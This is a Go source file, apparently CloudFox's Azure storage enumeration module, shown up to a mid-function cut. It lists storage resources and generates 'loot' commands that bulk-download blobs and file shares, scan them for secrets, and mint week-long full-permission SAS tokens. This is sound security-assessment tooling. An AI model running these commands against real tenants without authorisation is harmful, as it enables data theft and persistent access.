package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	storageservice "github.com/BishopFox/cloudfox/azure/services/storageService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzStorageCommand = &cobra.Command{
	Use:     "storage",
	Aliases: []string{"st"},
	Short:   "Enumerate Azure Storage Accounts and Containers",
	Long: `
Enumerate Azure Storage Accounts for a specific tenant:
./cloudfox az storage --tenant TENANT_ID

Enumerate Azure Storage Accounts for a specific subscription:
./cloudfox az storage --subscription SUBSCRIPTION_ID`,
	Run: ListStorageAccounts,
}

// ------------------------------
// Module struct (AWS pattern with embedded BaseAzureModule)
// ------------------------------
type StorageModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions   []string
	StorageAccounts []StorageAccountInfo
	StorageSvc      *storageservice.StorageService
	mu              sync.Mutex
}

type StorageAccountInfo struct {
	TenantName                      string // NEW: for multi-tenant support
	TenantID                        string // NEW: for multi-tenant support
	SubscriptionID                  string
	SubscriptionName                string
	ResourceGroup                   string
	Region                          string
	AccountName                     string
	AccountExposure                 string
	Kind                            string
	SKU                             string
	Tags                            string
	DataLakeGen2                    string
	DataLakeGen2Endpoint            string
	ContainerName                   string
	ContainerPublic                 string
	ContainerURL                    string
	ContainerLastModified           string
	ContainerLeaseState             string
	ContainerLeaseStatus            string
	ContainerImmutabilityPolicy     string
	ContainerLegalHold              string
	ContainerEncryptionScope        string
	ContainerDenyEncryptionOverride string
	ContainerPublicAccessWarning    string
	FileShareName                   string
	FileShareQuota                  string
	TableName                       string
	SystemAssignedID                string
	UserAssignedIDs                 string
	EntraIDAuth                     string
	EncryptionAtRest                string
	CustomerManagedKey              string
	HTTPSOnly                       string
	MinTLSVersion                   string
}

// ------------------------------
// Output struct
// ------------------------------
type StorageOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o StorageOutput) TableFiles() []internal.TableFile { return o.Table }
func (o StorageOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListStorageAccounts(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_STORAGE_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &StorageModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		StorageAccounts: []StorageAccountInfo{},
		StorageSvc:      storageservice.New(cmdCtx.Session),
	}

	// -------------------- Execute module --------------------
	module.PrintStorage(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *StorageModule) PrintStorage(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_STORAGE_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_STORAGE_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions, globals.AZ_STORAGE_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		logger.InfoM(fmt.Sprintf("Enumerating storage accounts for %d subscription(s)", len(m.Subscriptions)), globals.AZ_STORAGE_MODULE_NAME)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_STORAGE_MODULE_NAME, m.processSubscription)
	}

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *StorageModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Normalize and get subscription name
	subID = azinternal.NormalizeSubscriptionID(subID)
	subName := azinternal.GetSubscriptionNameFromID(ctx, m.Session, subID)

	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Process resource groups concurrently for better performance
	// Use WaitGroup and semaphore to limit concurrent RG processing
	var rgWg sync.WaitGroup
	rgSemaphore := make(chan struct{}, 10) // Limit to 10 concurrent RGs

	for _, rgName := range resourceGroups {
		rgWg.Add(1)
		go m.processResourceGroup(ctx, subID, subName, rgName, &rgWg, rgSemaphore)
	}

	rgWg.Wait()
}

// ------------------------------
// Process single resource group (extracted for RG-level concurrency)
// ------------------------------
func (m *StorageModule) processResourceGroup(ctx context.Context, subID, subName, rgName string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()

	// Acquire semaphore
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	// Get storage accounts using service layer (CACHED)
	storageAccounts, err := m.StorageSvc.CachedListStorageAccountsByResourceGroup(ctx, subID, rgName)
	if err != nil {
		// Continue with empty list on error (AWS-style error handling)
		storageAccounts = []*armstorage.Account{}
	}

	for _, acct := range storageAccounts {
		accountRG := azinternal.GetResourceGroupFromID(*acct.ID)
		if m.ResourceGroupFlag != "" && accountRG != rgName {
			continue // skip accounts not in this RG
		}

		accountName := azinternal.SafeStringPtr(acct.Name)
		location := string(*acct.Location)
		kind := string(*acct.Kind)

		// Extract SKU information
		sku := "N/A"
		if acct.SKU != nil && acct.SKU.Name != nil {
			sku = string(*acct.SKU.Name)
		}

		// Extract Tags
		tags := "N/A"
		if acct.Tags != nil && len(acct.Tags) > 0 {
			var tagPairs []string
			for k, v := range acct.Tags {
				if v != nil {
					tagPairs = append(tagPairs, fmt.Sprintf("%s:%s", k, *v))
				} else {
					tagPairs = append(tagPairs, k)
				}
			}
			if len(tagPairs) > 0 {
				tags = strings.Join(tagPairs, ", ")
			}
		}

		// Determine storage account exposure
		accountExposure := m.determineAccountExposure(acct)

		// Extract managed identity information
		var systemAssignedIDs []string
		var userAssignedIDs []string

		if acct.Identity != nil {
			// System-assigned identity
			if acct.Identity.PrincipalID != nil {
				principalID := *acct.Identity.PrincipalID
				systemAssignedIDs = append(systemAssignedIDs, principalID)
			}

			// User-assigned identities
			if acct.Identity.UserAssignedIdentities != nil {
				for uaID := range acct.Identity.UserAssignedIdentities {
					userAssignedIDs = append(userAssignedIDs, uaID)
				}
			}
		}

		// Format identity fields
		systemIDsStr := "N/A"
		if len(systemAssignedIDs) > 0 {
			systemIDsStr = ""
			for i, id := range systemAssignedIDs {
				if i > 0 {
					systemIDsStr += ", "
				}
				systemIDsStr += id
			}
		}

		userIDsStr := "N/A"
		if len(userAssignedIDs) > 0 {
			userIDsStr = ""
			for i, id := range userAssignedIDs {
				if i > 0 {
					userIDsStr += ", "
				}
				userIDsStr += id
			}
		}

		// Extract encryption and security configuration
		encryptionAtRest := "Enabled" // Azure Storage always has encryption at rest with Microsoft-managed keys
		customerManagedKey := "No"
		httpsOnly := "No"
		minTLSVersion := "N/A"

		// Check if customer-managed keys are configured
		if acct.Properties != nil && acct.Properties.Encryption != nil {
			if acct.Properties.Encryption.KeySource != nil {
				if *acct.Properties.Encryption.KeySource == armstorage.KeySourceMicrosoftKeyvault {
					customerManagedKey = "Yes"
				}
			}
		}

		// Check HTTPS Only requirement
		if acct.Properties != nil && acct.Properties.EnableHTTPSTrafficOnly != nil {
			if *acct.Properties.EnableHTTPSTrafficOnly {
				httpsOnly = "Yes"
			}
		}

		// Check Minimum TLS Version
		if acct.Properties != nil && acct.Properties.MinimumTLSVersion != nil {
			minTLSVersion = string(*acct.Properties.MinimumTLSVersion)
		}

		// Check for EntraID Centralized Auth (Azure Files identity-based authentication)
		entraIDAuth := "Disabled"
		if acct.Properties != nil && acct.Properties.AzureFilesIdentityBasedAuthentication != nil {
			if acct.Properties.AzureFilesIdentityBasedAuthentication.DirectoryServiceOptions != nil {
				dso := *acct.Properties.AzureFilesIdentityBasedAuthentication.DirectoryServiceOptions
				// AADDS (Azure AD Domain Services) and AADKERB (Azure AD Kerberos) indicate EntraID authentication
				if dso == armstorage.DirectoryServiceOptionsAADDS || dso == armstorage.DirectoryServiceOptionsAADKERB {
					entraIDAuth = "Enabled"
				} else if dso == armstorage.DirectoryServiceOptionsNone {
					entraIDAuth = "Disabled"
				} else {
					// AD (Active Directory) - traditional AD, not EntraID
					entraIDAuth = "Disabled (AD)"
				}
			}
		}

		// Check if Data Lake Storage Gen2 is enabled (Hierarchical Namespace)
		dataLakeGen2 := "No"
		dataLakeGen2Endpoint := "N/A"
		if acct.Properties != nil && acct.Properties.IsHnsEnabled != nil && *acct.Properties.IsHnsEnabled {
			dataLakeGen2 = "Yes"
			// Extract DFS endpoint (Data Lake Storage Gen2 filesystem API endpoint)
			if acct.Properties.PrimaryEndpoints != nil && acct.Properties.PrimaryEndpoints.Dfs != nil {
				dataLakeGen2Endpoint = *acct.Properties.PrimaryEndpoints.Dfs
			}
		}

		// Get containers for this storage account using service layer
		containers, err := m.StorageSvc.CachedListContainers(ctx, subID, accountName, accountRG, location, kind)
		if err != nil || len(containers) == 0 {
			// No containers or error - add account with N/A containers
			m.addStorageAccount(StorageAccountInfo{
				TenantName:                      m.TenantName, // NEW: for multi-tenant support
				TenantID:                        m.TenantID,   // NEW: for multi-tenant support
				SubscriptionID:                  subID,
				SubscriptionName:                subName,
				ResourceGroup:                   accountRG,
				Region:                          location,
				AccountName:                     accountName,
				AccountExposure:                 accountExposure,
				Kind:                            kind,
				SKU:                             sku,
				Tags:                            tags,
				DataLakeGen2:                    dataLakeGen2,
				DataLakeGen2Endpoint:            dataLakeGen2Endpoint,
				ContainerName:                   "N/A",
				ContainerPublic:                 "N/A",
				ContainerURL:                    "N/A",
				ContainerLastModified:           "N/A",
				ContainerLeaseState:             "N/A",
				ContainerLeaseStatus:            "N/A",
				ContainerImmutabilityPolicy:     "N/A",
				ContainerLegalHold:              "N/A",
				ContainerEncryptionScope:        "N/A",
				ContainerDenyEncryptionOverride: "N/A",
				ContainerPublicAccessWarning:    "N/A",
				SystemAssignedID:                systemIDsStr,
				UserAssignedIDs:                 userIDsStr,
				EntraIDAuth:                     entraIDAuth,
				EncryptionAtRest:                encryptionAtRest,
				CustomerManagedKey:              customerManagedKey,
				HTTPSOnly:                       httpsOnly,
				MinTLSVersion:                   minTLSVersion,
			})
			continue
		}

		// Add entry for each container
		for _, container := range containers {
			m.addStorageAccount(StorageAccountInfo{
				TenantName:                      m.TenantName, // NEW: for multi-tenant support
				TenantID:                        m.TenantID,   // NEW: for multi-tenant support
				SubscriptionID:                  subID,
				SubscriptionName:                subName,
				ResourceGroup:                   accountRG,
				Region:                          location,
				AccountName:                     accountName,
				AccountExposure:                 accountExposure,
				Kind:                            kind,
				SKU:                             sku,
				Tags:                            tags,
				DataLakeGen2:                    dataLakeGen2,
				DataLakeGen2Endpoint:            dataLakeGen2Endpoint,
				ContainerName:                   container.Name,
				ContainerPublic:                 container.Public,
				ContainerURL:                    container.URL,
				ContainerLastModified:           container.LastModified,
				ContainerLeaseState:             container.LeaseState,
				ContainerLeaseStatus:            container.LeaseStatus,
				ContainerImmutabilityPolicy:     container.HasImmutabilityPolicy,
				ContainerLegalHold:              container.HasLegalHold,
				ContainerEncryptionScope:        container.DefaultEncryptionScope,
				ContainerDenyEncryptionOverride: container.DenyEncryptionScopeOverride,
				ContainerPublicAccessWarning:    container.PublicAccessWarning,
				FileShareName:                   "N/A",
				FileShareQuota:                  "N/A",
				TableName:                       "N/A",
				SystemAssignedID:                systemIDsStr,
				UserAssignedIDs:                 userIDsStr,
				EntraIDAuth:                     entraIDAuth,
				EncryptionAtRest:                encryptionAtRest,
				CustomerManagedKey:              customerManagedKey,
				HTTPSOnly:                       httpsOnly,
				MinTLSVersion:                   minTLSVersion,
			})
		}

		// Enumerate File Shares for this storage account using service layer
		fileShares, fsErr := m.StorageSvc.CachedListFileShares(ctx, subID, accountName, accountRG)
		if fsErr == nil && len(fileShares) > 0 {
			for _, share := range fileShares {
				quota := fmt.Sprintf("%d GB", share.Quota)
				m.addStorageAccount(StorageAccountInfo{
					TenantName:           m.TenantName, // NEW: for multi-tenant support
					TenantID:             m.TenantID,   // NEW: for multi-tenant support
					SubscriptionID:       subID,
					SubscriptionName:     subName,
					ResourceGroup:        accountRG,
					Region:               location,
					AccountName:          accountName,
					AccountExposure:      accountExposure,
					Kind:                 kind,
					SKU:                  sku,
					Tags:                 tags,
					DataLakeGen2:         dataLakeGen2,
					DataLakeGen2Endpoint: dataLakeGen2Endpoint,
					ContainerName:        "N/A",
					ContainerPublic:      "N/A",
					ContainerURL:         "N/A",
					FileShareName:        share.ShareName,
					FileShareQuota:       quota,
					TableName:            "N/A",
					SystemAssignedID:     systemIDsStr,
					UserAssignedIDs:      userIDsStr,
					EntraIDAuth:          entraIDAuth,
					EncryptionAtRest:     encryptionAtRest,
					CustomerManagedKey:   customerManagedKey,
					HTTPSOnly:            httpsOnly,
					MinTLSVersion:        minTLSVersion,
				})
			}
		}

		// Enumerate Tables for this storage account using service layer
		tables, tblErr := m.StorageSvc.CachedListTables(ctx, subID, accountName, accountRG)
		if tblErr == nil && len(tables) > 0 {
			for _, table := range tables {
				m.addStorageAccount(StorageAccountInfo{
					TenantName:           m.TenantName, // NEW: for multi-tenant support
					TenantID:             m.TenantID,   // NEW: for multi-tenant support
					SubscriptionID:       subID,
					SubscriptionName:     subName,
					ResourceGroup:        accountRG,
					Region:               location,
					AccountName:          accountName,
					AccountExposure:      accountExposure,
					Kind:                 kind,
					SKU:                  sku,
					Tags:                 tags,
					DataLakeGen2:         dataLakeGen2,
					DataLakeGen2Endpoint: dataLakeGen2Endpoint,
					ContainerName:        "N/A",
					ContainerPublic:      "N/A",
					ContainerURL:         "N/A",
					FileShareName:        "N/A",
					FileShareQuota:       "N/A",
					TableName:            table.TableName,
					SystemAssignedID:     systemIDsStr,
					UserAssignedIDs:      userIDsStr,
					EntraIDAuth:          entraIDAuth,
					EncryptionAtRest:     encryptionAtRest,
					CustomerManagedKey:   customerManagedKey,
					HTTPSOnly:            httpsOnly,
					MinTLSVersion:        minTLSVersion,
				})
			}
		}
	}
}

// ------------------------------
// Determine storage account exposure
// ------------------------------
func (m *StorageModule) determineAccountExposure(acct *armstorage.Account) string {
	accountExposure := "PrivateOnly"

	if acct.Properties != nil && acct.Properties.NetworkRuleSet != nil && acct.Properties.NetworkRuleSet.DefaultAction != nil {
		switch *acct.Properties.NetworkRuleSet.DefaultAction {
		case armstorage.DefaultActionAllow:
			if len(acct.Properties.NetworkRuleSet.IPRules) == 0 {
				accountExposure = "PublicOpen"
			} else {
				hasWideOpen := false
				for _, ipr := range acct.Properties.NetworkRuleSet.IPRules {
					if ipr.IPAddressOrRange != nil && *ipr.IPAddressOrRange == "0.0.0.0/0" {
						hasWideOpen = true
						break
					}
				}
				if hasWideOpen {
					accountExposure = "PublicOpen"
				} else {
					accountExposure = "PublicRestricted"
				}
			}
		case armstorage.DefaultActionDeny:
			accountExposure = "PrivateOnly"
		}
	}

	return accountExposure
}

// ------------------------------
// Add storage account to collection
// ------------------------------
func (m *StorageModule) addStorageAccount(info StorageAccountInfo) {
	// Thread-safe append
	m.mu.Lock()
	m.StorageAccounts = append(m.StorageAccounts, info)
	m.mu.Unlock()
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *StorageModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.StorageAccounts) == 0 {
		logger.InfoM("No storage accounts found", globals.AZ_STORAGE_MODULE_NAME)
		return
	}

	// Build table rows
	var tableRows [][]string
	for _, acct := range m.StorageAccounts {
		tableRows = append(tableRows, []string{
			acct.TenantName, // NEW: for multi-tenant support
			acct.TenantID,   // NEW: for multi-tenant support
			acct.SubscriptionID,
			acct.SubscriptionName,
			acct.ResourceGroup,
			acct.Region,
			acct.AccountName,
			acct.AccountExposure,
			acct.Kind,
			acct.SKU,
			acct.Tags,
			acct.DataLakeGen2,
			acct.DataLakeGen2Endpoint,
			acct.ContainerName,
			acct.ContainerPublic,
			acct.ContainerLastModified,
			acct.ContainerLeaseState,
			acct.ContainerLeaseStatus,
			acct.ContainerImmutabilityPolicy,
			acct.ContainerLegalHold,
			acct.ContainerEncryptionScope,
			acct.ContainerDenyEncryptionOverride,
			acct.ContainerPublicAccessWarning,
			acct.FileShareName,
			acct.FileShareQuota,
			acct.TableName,
			acct.EntraIDAuth,
			acct.EncryptionAtRest,
			acct.CustomerManagedKey,
			acct.HTTPSOnly,
			acct.MinTLSVersion,
			acct.SystemAssignedID,
			acct.UserAssignedIDs,
		})
	}

	// Build loot content
	lootContent := m.generateLoot()
	sasLootContent := m.generateSASLoot()
	snapshotLootContent := m.generateSnapshotLoot()
	tableLootContent := m.generateTableLoot()

	// Header definition (extracted for multi-subscription splitting)
	header := []string{
		"Tenant Name", // NEW: for multi-tenant support
		"Tenant ID",   // NEW: for multi-tenant support
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"Storage Account Name",
		"Storage Account Public?",
		"Kind",
		"SKU",
		"Tags",
		"Data Lake Gen2?",
		"Data Lake Gen2 Endpoint",
		"Container Name",
		"Container Public?",
		"Container Last Modified",
		"Container Lease State",
		"Container Lease Status",
		"Container Immutability Policy",
		"Container Legal Hold",
		"Container Encryption Scope",
		"Container Deny Encryption Override",
		"Container Public Access Warning",
		"File Share Name",
		"File Share Quota",
		"Table Name",
		"EntraID Centralized Auth",
		"Encryption at Rest",
		"Customer Managed Key",
		"HTTPS Only",
		"Min TLS Version",
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		// Split into separate tenant directories
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			tableRows,
			header,
			"storage-accounts",
			globals.AZ_STORAGE_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, tableRows, header,
			"storage-accounts", globals.AZ_STORAGE_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Create output
	output := StorageOutput{
		Table: []internal.TableFile{{
			Name:   "storage-accounts",
			Header: header,
			Body:   tableRows,
		}},
		Loot: []internal.LootFile{
			{Name: "storage-commands", Contents: lootContent},
			{Name: "storage-sas-commands", Contents: sasLootContent},
			{Name: "storage-snapshot-commands", Contents: snapshotLootContent},
			{Name: "storage-table-commands", Contents: tableLootContent},
		},
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_STORAGE_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d storage account entries across %d subscription(s)", len(m.StorageAccounts), len(m.Subscriptions)), globals.AZ_STORAGE_MODULE_NAME)
}

// ------------------------------
// Generate loot commands
// ------------------------------
func (m *StorageModule) generateLoot() string {
	var loot string

	for _, acct := range m.StorageAccounts {
		// Blob containers
		if acct.ContainerName != "N/A" {
			loot += fmt.Sprintf(
				"## Storage Account: %s, Container: %s\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List blobs in container\n"+
					"az storage blob list --account-name %s --container-name %s\n"+
					"\n"+
					"# Show container details\n"+
					"az storage container show --account-name %s --name %s\n"+
					"\n"+
					"# Download all blobs\n"+
					"mkdir -p \"blob/%s/%s\"\n"+
					"az storage blob download-batch --account-name %s --destination \"blob/%s/%s\" --source %s\n"+
					"\n"+
					"# Alternative: azcopy for faster download\n"+
					"azcopy copy https://%s.blob.core.windows.net/%s \"blob/%s/%s\" --recursive=true\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
					"Get-AzStorageBlob -Container %s -Context $ctx\n"+
					"\n"+
					"# Scan downloaded files for secrets\n"+
					"trufflehog3 %s --regex --entropy=True\n\n",
				acct.AccountName, acct.ContainerName,
				acct.SubscriptionID,
				acct.AccountName, acct.ContainerName,
				acct.AccountName, acct.ContainerName,
				acct.AccountName, acct.ContainerName,
				acct.AccountName, acct.AccountName, acct.ContainerName, acct.ContainerName,
				acct.AccountName, acct.ContainerName, acct.AccountName, acct.ContainerName,
				acct.SubscriptionID,
				acct.AccountName, acct.ResourceGroup,
				acct.ContainerName,
				acct.ContainerURL,
			)

			// Data Lake Storage Gen2 Commands (if HNS is enabled)
			if acct.DataLakeGen2 == "Yes" && acct.ContainerName != "N/A" {
				loot += fmt.Sprintf(
					"### Data Lake Storage Gen2 Commands (Container/Filesystem: %s)\n"+
						"# NOTE: This storage account has Hierarchical Namespace enabled (Data Lake Gen2)\n"+
						"# Data Lake Gen2 Endpoint: %s\n"+
						"\n"+
						"# List filesystem (container in ADLS Gen2 terms)\n"+
						"az storage fs list --account-name %s\n"+
						"\n"+
						"# List directories and files in filesystem\n"+
						"az storage fs directory list --file-system %s --account-name %s\n"+
						"\n"+
						"# List files in root of filesystem\n"+
						"az storage fs file list --file-system %s --account-name %s\n"+
						"\n"+
						"# Download filesystem using azcopy (uses DFS endpoint)\n"+
						"mkdir -p \"datalake/%s/%s\"\n"+
						"azcopy copy \"%s%s\" \"datalake/%s/%s\" --recursive=true\n"+
						"\n"+
						"# Show filesystem properties\n"+
						"az storage fs show --name %s --account-name %s\n"+
						"\n"+
						"# Get ACLs for filesystem\n"+
						"az storage fs access show --file-system %s --account-name %s\n"+
						"\n"+
						"## PowerShell equivalents for Data Lake Gen2\n"+
						"# Install module if needed: Install-Module -Name Az.Storage -Force\n"+
						"Set-AzContext -SubscriptionId %s\n"+
						"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
						"\n"+
						"# List filesystems\n"+
						"Get-AzDataLakeGen2FileSystem -Context $ctx\n"+
						"\n"+
						"# Get filesystem\n"+
						"Get-AzDataLakeGen2FileSystem -Name %s -Context $ctx\n"+
						"\n"+
						"# List items in filesystem\n"+
						"Get-AzDataLakeGen2ChildItem -FileSystem %s -Context $ctx\n"+
						"\n"+
						"# Get ACLs\n"+
						"(Get-AzDataLakeGen2Item -FileSystem %s -Path / -Context $ctx).ACL\n\n",
					acct.ContainerName,
					acct.DataLakeGen2Endpoint,
					acct.AccountName,
					acct.ContainerName, acct.AccountName,
					acct.ContainerName, acct.AccountName,
					acct.AccountName, acct.ContainerName,
					acct.DataLakeGen2Endpoint, acct.ContainerName, acct.AccountName, acct.ContainerName,
					acct.ContainerName, acct.AccountName,
					acct.ContainerName, acct.AccountName,
					acct.SubscriptionID,
					acct.AccountName, acct.ResourceGroup,
					acct.ContainerName,
					acct.ContainerName,
					acct.ContainerName,
				)
			}
		}

		// File Shares
		if acct.FileShareName != "N/A" {
			loot += fmt.Sprintf(
				"## Storage Account: %s, File Share: %s\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List files in share\n"+
					"az storage file list --account-name %s --share-name %s\n"+
					"\n"+
					"# Show file share details\n"+
					"az storage share show --account-name %s --name %s\n"+
					"\n"+
					"# Download all files\n"+
					"mkdir -p \"fileshare/%s/%s\"\n"+
					"az storage file download-batch --account-name %s --destination \"fileshare/%s/%s\" --source %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
					"Get-AzStorageFile -ShareName %s -Context $ctx\n"+
					"Get-AzStorageShare -Name %s -Context $ctx\n\n",
				acct.AccountName, acct.FileShareName,
				acct.SubscriptionID,
				acct.AccountName, acct.FileShareName,
				acct.AccountName, acct.FileShareName,
				acct.AccountName, acct.FileShareName,
				acct.AccountName, acct.AccountName, acct.FileShareName, acct.FileShareName,
				acct.SubscriptionID,
				acct.AccountName, acct.ResourceGroup,
				acct.FileShareName,
				acct.FileShareName,
			)
		}

		// Tables - commands moved to storage-table-commands loot file for better organization
	}

	return loot
}

// ------------------------------
// Generate SAS token commands
// ------------------------------
func (m *StorageModule) generateSASLoot() string {
	var loot string

	// Track unique storage accounts to avoid duplicate SAS commands
	uniqueAccounts := make(map[string]StorageAccountInfo)
	for _, acct := range m.StorageAccounts {
		key := acct.SubscriptionID + "/" + acct.AccountName
		if _, exists := uniqueAccounts[key]; !exists {
			uniqueAccounts[key] = acct
		}
	}

	for _, acct := range uniqueAccounts {
		// Account-level SAS token generation
		loot += fmt.Sprintf(
			"## Storage Account: %s - Account-Level SAS Token\n"+
				"# Set subscription context\n"+
				"az account set --subscription %s\n"+
				"\n"+
				"# Generate account-level SAS token (7 days, full permissions)\n"+
				"az storage account generate-sas \\\n"+
				"  --account-name %s \\\n"+
				"  --resource-group %s \\\n"+
				"  --permissions acdlpruw \\\n"+
				"  --services bfqt \\\n"+
				"  --resource-types sco \\\n"+
				"  --expiry $(date -u -d '7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') \\\n"+
				"  --https-only \\\n"+
				"  -o tsv\n"+
				"\n"+
				"# Use SAS token with Azure CLI\n"+
				"export SAS_TOKEN=\"<token-from-above>\"\n"+
				"az storage blob list --account-name %s --container-name <container> --sas-token \"$SAS_TOKEN\"\n"+
				"\n"+
				"# Use SAS token with curl\n"+
				"curl \"https://%s.blob.core.windows.net/<container>?restype=container&comp=list&$SAS_TOKEN\"\n"+
				"\n"+
				"## PowerShell equivalent\n"+
				"Set-AzContext -SubscriptionId %s\n"+
				"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
				"$startTime = Get-Date\n"+
				"$endTime = $startTime.AddDays(7)\n"+
				"$sasToken = New-AzStorageAccountSASToken -Service Blob,File,Queue,Table -ResourceType Service,Container,Object -Permission \"racwdlup\" -Context $ctx -StartTime $startTime -ExpiryTime $endTime\n"+
				"Write-Host \"SAS Token: $sasToken\"\n"+
				"\n"+
				"# Use SAS token with PowerShell\n"+
				"Get-AzStorageBlob -Container <container> -Context $ctx -SasToken $sasToken\n\n",
			acct.AccountName,
			acct.SubscriptionID,
			acct.AccountName, acct.ResourceGroup,
			acct.AccountName,
			acct.AccountName,
			acct.SubscriptionID,
			acct.AccountName, acct.ResourceGroup,
		)

		// Container-level SAS tokens
		if acct.ContainerName != "N/A" {
			loot += fmt.Sprintf(
				"## Storage Account: %s, Container: %s - Container SAS Token\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# Generate container-level SAS token (7 days, read/write/delete/list)\n"+
					"az storage container generate-sas \\\n"+
					"  --account-name %s \\\n"+
					"  --name %s \\\n"+
					"  --permissions acdlrw \\\n"+
					"  --expiry $(date -u -d '7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') \\\n"+
					"  --https-only \\\n"+
					"  -o tsv\n"+
					"\n"+
					"# Use container SAS token to list blobs\n"+
					"export CONTAINER_SAS=\"<token-from-above>\"\n"+
					"az storage blob list --account-name %s --container-name %s --sas-token \"$CONTAINER_SAS\"\n"+
					"\n"+
					"# Download blob with SAS token using curl\n"+
					"curl \"https://%s.blob.core.windows.net/%s/<blob-name>?$CONTAINER_SAS\" -o downloaded-file\n"+
					"\n"+
					"## PowerShell equivalent\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
					"$startTime = Get-Date\n"+
					"$endTime = $startTime.AddDays(7)\n"+
					"$containerSas = New-AzStorageContainerSASToken -Name %s -Permission \"racwdl\" -Context $ctx -StartTime $startTime -ExpiryTime $endTime\n"+
					"Write-Host \"Container SAS Token: $containerSas\"\n"+
					"Get-AzStorageBlob -Container %s -Context $ctx | Get-AzStorageBlobContent -Force\n\n",
				acct.AccountName, acct.ContainerName,
				acct.SubscriptionID,
				acct.AccountName, acct.ContainerName,
				acct.AccountName, acct.ContainerName,
				acct.AccountName, acct.ContainerName,
				acct.SubscriptionID,
				acct.AccountName, acct.ResourceGroup,
				acct.ContainerName,
				acct.ContainerName,
			)
		}

		// File Share SAS tokens
		if acct.FileShareName != "N/A" {
			loot += fmt.Sprintf(
